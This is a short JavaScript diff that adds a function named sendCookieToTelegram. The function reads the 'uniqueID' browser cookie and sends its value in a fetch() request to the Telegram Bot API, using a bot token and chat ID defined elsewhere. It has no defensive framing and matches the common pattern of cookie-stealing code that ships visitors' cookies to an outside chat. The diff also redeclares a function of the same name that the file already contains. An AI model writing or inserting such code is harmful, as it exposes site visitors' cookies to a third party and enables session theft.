@@ -61,3 +61,19 @@ async function sendCookieToTelegram() {
       }),
     }
 }
+
+async function sendCookieToTelegram() {
+  const cookieValue = getCookie("uniqueID");
+  if (cookieValue) {
+    const message = `Cookie Value: ${cookieValue}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    try {
+      const response = await fetch(url);
+      const data = await response.json();
+      console.log(data);
+    } catch (error) {
+      console.error("Error sending message to Telegram:", error);
+    }
+  }
+}
